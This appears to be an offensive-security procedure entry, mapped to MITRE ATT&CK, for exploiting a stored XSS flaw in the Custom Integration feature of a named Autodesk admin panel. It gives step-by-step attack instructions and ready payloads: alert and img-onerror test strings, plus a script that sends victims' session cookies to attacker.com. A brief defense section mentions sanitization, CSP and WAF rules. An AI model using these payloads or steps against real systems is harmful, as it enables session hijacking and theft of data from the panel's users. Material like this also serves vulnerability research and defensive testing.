---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
name: Inject-Stored-XSS-Payload-in-Custom-Integration
tags:
  - xss
  - stored-xss
  - injection
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:56:03.690Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Stored-XSS-Payload-in-Custom-Integration

## Summary

This procedure exploits a stored cross-site scripting (XSS) vulnerability in the Custom Integration feature of Autodesk's admin panel at https://admin.b360.autodesk.com by injecting malicious JavaScript code into a form field. The payload is stored server-side and executes in the browser of any user who views the affected integration settings, potentially leading to session hijacking, data exfiltration, or further attacks.

## Description

The vulnerability arises from insufficient input sanitization or output encoding in the Custom Integration feature, allowing attackers with access to the admin panel to submit JavaScript payloads that persist in the database. When administrators or other users load the integration configuration page, the unsanitized input is rendered, triggering the script in their session context. This stored XSS can be used to steal cookies, redirect users, or perform actions on behalf of the victim. Prerequisites include authenticated access to the admin panel; the attack targets web browsers as the execution environment.

## Requirements

1. Authenticated session to https://admin.b360.autodesk.com with permissions to access Custom Integrations
2. Modern web browser (e.g., Chrome, Firefox) with developer tools enabled for payload testing
3. Basic knowledge of JavaScript for crafting payloads

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization using libraries like DOMPurify on all user inputs
- Apply content security policy (CSP) headers to restrict script execution
- Monitor for anomalous JavaScript execution in browser logs or via web application firewall (WAF) rules detecting common XSS payloads

## Objectives

1. Persist malicious JavaScript in the Custom Integration storage
2. Achieve code execution in the context of viewing users' browsers
3. Demonstrate potential for unauthorized actions or data collection

## Instructions

### Step 1: Authenticate and Navigate

**Context**: Gain access to the vulnerable feature to prepare for payload injection.

Log in to the Autodesk admin panel at https://admin.b360.autodesk.com using valid admin credentials. Navigate to the Custom Integration section, typically under settings or integrations menu.

### Step 2: Identify Injection Point

**Context**: Locate the unsanitized input field for the payload.

Inspect the form fields in the Custom Integration creation or editing interface. Common targets include description, name, or configuration fields that accept HTML or text without proper escaping. Use browser developer tools (F12) to examine the HTML structure and identify where user input is reflected.

### Step 3: Craft and Submit Payload

**Context**: Inject a test payload to verify execution, then escalate if needed.

Enter a simple payload like `<script>alert('XSS Test');</script>` into the vulnerable field. Submit the form. If blocked, try variations such as `<img src=x onerror=alert('XSS')>`. After submission, log out and log in with another account (or use incognito) to view the integration and confirm execution.

> For more advanced payloads, use `<script>document.location='http://attacker.com/steal?cookie='+document.cookie;</script>` to exfiltrate session data.

### Step 4: Verify Execution

**Context**: Confirm the stored payload executes for other users.

View the Custom Integration page as a different user. Check browser console for errors and verify the alert or redirection occurs, indicating successful exploitation.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[injection]]
